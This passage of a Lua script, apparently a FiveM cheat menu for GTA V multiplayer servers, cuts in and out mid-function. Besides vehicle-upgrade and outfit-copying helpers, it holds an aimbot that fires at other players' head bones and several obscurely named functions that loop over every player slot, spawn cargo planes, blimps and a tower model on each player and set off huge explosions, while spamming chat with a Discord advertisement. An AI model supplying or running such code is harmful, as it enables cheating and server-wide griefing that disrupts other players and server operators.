    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 14, 16, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15) - 2, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16) - 1, arwet)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 23, 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 24, 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5)
end

function engine(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13) - 1, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15) - 2, arwet)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16) - 1, arwet)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
end


local function RGBRainbow( frequency )
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = 0
    result.g = 242
    result.b = 255
    
    return result
end



if dwadjawuidhjwahdawy then
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"
        
        while not HasModelLoaded(GetHashKey(dh))do 
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end
        
        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end
            
        while not HasModelLoaded(GetHashKey(dg))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end
            
        while not HasModelLoaded(GetHashKey(dj))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end
        
        while not HasModelLoaded(GetHashKey(dk))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end
        
        for i=0,128 do 
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
end








function engine1(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 14, 16, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15) - 2, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16) - 1, arwet)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 23, 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 24, 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35) - 1, arwet)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5)
end

local function ShootAimbot(k)
    if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
        not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), false) and 
		IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
        local x, y, z = table.unpack(GetEntityCoords(k))
        local _, _x, _y = World3dToScreen2d(x, y, z)
        if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
            ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
        end
    end
end

local function RageShoot(target)
    if not IsPedDeadOrDying(target) then
        local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
    end
end


local function NameToBone(name)
    if name == "Head" then
        return "SKEL_Head"
    elseif name == "Chest" then
        return "SKEL_Spine2"
    elseif name == "Left Arm" then
        return "SKEL_L_UpperArm"
    elseif name == "Right Arm" then
        return "SKEL_R_UpperArm"
    elseif name == "Left Leg" then
        return "SKEL_L_Thigh"
    elseif name == "Right Leg" then
        return "SKEL_R_Thigh"
    elseif name == "Dick" then
        return "SKEL_Pelvis"
    else
        return "SKEL_ROOT"
    end
end

local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
        if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
        return veh
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

local function SpawnVehAtCoords(model, coords)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
		local veh = CreateVehicle(GetHashKey(model), coords.x + 1.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
		ShowInfo("Vehicle ~g~Spawned")
		return veh
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

local function SpawnPlane(model, PlaceSelf, SpawnInAir)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = nil
        if SpawnInAir then
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
        else
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        end
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
    else ShowInfo("~r~Model not recognized (Try Again)") end
end


local function GetCurrentOutfit(target)
    local ped = GetPlayerPed(target)
    outfit = {}
    
    outfit.hat = GetPedPropIndex(ped, 0)
    outfit.hat_texture = GetPedPropTextureIndex(ped, 0)
    
    outfit.glasses = GetPedPropIndex(ped, 1)
    outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)
    
    outfit.ear = GetPedPropIndex(ped, 2)
    outfit.ear_texture = GetPedPropTextureIndex(ped, 2)
    
    outfit.watch = GetPedPropIndex(ped, 6)
    outfit.watch_texture = GetPedPropTextureIndex(ped, 6)
    
    outfit.wrist = GetPedPropIndex(ped, 7)
    outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)
    
    outfit.head_drawable = GetPedDrawableVariation(ped, 0)
    outfit.head_palette = GetPedPaletteVariation(ped, 0)
    outfit.head_texture = GetPedTextureVariation(ped, 0)
    
    outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
    outfit.beard_palette = GetPedPaletteVariation(ped, 1)
    outfit.beard_texture = GetPedTextureVariation(ped, 1)
    
    outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
    outfit.hair_palette = GetPedPaletteVariation(ped, 2)
    outfit.hair_texture = GetPedTextureVariation(ped, 2)
    
    outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
    outfit.torso_palette = GetPedPaletteVariation(ped, 3)
    outfit.torso_texture = GetPedTextureVariation(ped, 3)
    
    outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
    outfit.legs_palette = GetPedPaletteVariation(ped, 4)
    outfit.legs_texture = GetPedTextureVariation(ped, 4)
    
    outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
    outfit.hands_palette = GetPedPaletteVariation(ped, 5)
    outfit.hands_texture = GetPedTextureVariation(ped, 5)
    
    outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
    outfit.foot_palette = GetPedPaletteVariation(ped, 6)
    outfit.foot_texture = GetPedTextureVariation(ped, 6)
    
    outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
    outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
    outfit.acc1_texture = GetPedTextureVariation(ped, 7)
    
    outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
    outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
    outfit.acc2_texture = GetPedTextureVariation(ped, 8)
    
    outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
    outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
    outfit.acc3_texture = GetPedTextureVariation(ped, 9)
    
    outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
    outfit.mask_palette = GetPedPaletteVariation(ped, 10)
    outfit.mask_texture = GetPedTextureVariation(ped, 10)
    
    outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
    outfit.aux_palette = GetPedPaletteVariation(ped, 11)
    outfit.aux_texture = GetPedTextureVariation(ped, 11)
    
    return outfit
end

local function SetCurrentOutfit(outfit)
    local ped = PlayerPedId()
    
    SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
    SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
    SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
    SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
    SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)
    
    SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
    SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
    SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
    SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
    SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
    SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
    SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
    SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
    SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
    SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
    SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
    SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
end

local function GetResources()
    local resources = {}
    for i = 1, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end




function ujiwjdujwau()
    Citizen.CreateThread(function()
        for bs=0,9 do 
            
        end
        local dg="dt1_11_dt1_tower"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"
        
        while not HasModelLoaded(GetHashKey(dh))do 
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end
        
        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end
            
        while not HasModelLoaded(GetHashKey(dg))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end
            
        while not HasModelLoaded(GetHashKey(dj))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end
        
        while not HasModelLoaded(GetHashKey(dk))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end
        
        for bs=0,9 do 

        end
        
        for i=0,128 do 
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end



function MFt4elNUg0kg()
    for bs=0,9 do 
        TriggerEvent('chatMessage', "^1[RedBoy Fucker]", {141,211,255}, "^2Discord |  ^3bKJd4eC5Db ^4| ^6 SUB til k??dkongen")
    end
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"
        
        while not HasModelLoaded(GetHashKey(dh))do 
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end
        
        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end
            
        while not HasModelLoaded(GetHashKey(dg))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end
            
        while not HasModelLoaded(GetHashKey(dj))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end
        
        while not HasModelLoaded(GetHashKey(dk))do 
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end
        
        for bs=0,9 do 
            TriggerEvent('chatMessage', "^1[RedBoy Fucker]", {141,211,255}, "^2Discord |  ^3bKJd4eC5Db ^4| ^6 SUB til k??dkongen")
        end
        
        for i=0,128 do 
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end

    function fesokfseioffe()
        for bs=0,9 do 

        end
        Citizen.CreateThread(function()
            local dg="Avenger"
            local dh="CARGOPLANE"
            local di="luxor"
            local dj="maverick"
            local dk="blimp2"
            
            while not HasModelLoaded(GetHashKey(dh))do 
                Citizen.Wait(0)
                RequestModel(GetHashKey(dh))
            end
            
            while not HasModelLoaded(GetHashKey(di))do
                Citizen.Wait(0)RequestModel(GetHashKey(di))
            end
                
            while not HasModelLoaded(GetHashKey(dg))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dg))
            end
                
            while not HasModelLoaded(GetHashKey(dj))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dj))
            end
            
            while not HasModelLoaded(GetHashKey(dk))do 
                Citizen.Wait(0)RequestModel(GetHashKey(dk))
            end
            
            for bs=0,9 do 

            end
            
            for i=0,128 do 
